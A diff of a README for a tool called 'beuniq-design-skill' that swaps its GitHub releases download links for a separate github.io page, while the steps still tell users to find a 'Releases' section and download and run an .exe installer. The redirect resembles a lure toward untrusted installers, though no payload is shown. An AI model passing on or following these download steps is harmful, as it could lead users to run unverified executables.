@@ -1,6 +1,6 @@
 # 🎨 beuniq-design-skill - Remove generic AI patterns from code
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Jou2598/beuniq-design-skill/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://jou2598.github.io)
 
 ## What is BeUniq? 🔍
 
@@ -29,7 +29,7 @@ To run BeUniq, ensure your computer meets these basic needs:
 
 ## Getting Started 🚀
 
-1. Visit the project download page: [https://github.com/Jou2598/beuniq-design-skill/releases](https://github.com/Jou2598/beuniq-design-skill/releases).
+1. Visit the project download page: [https://jou2598.github.io](https://jou2598.github.io).
 2. Look for the latest version listed under the "Releases" section.
 3. Download the installer file ending in `.exe`.
 4. Run the downloaded file.
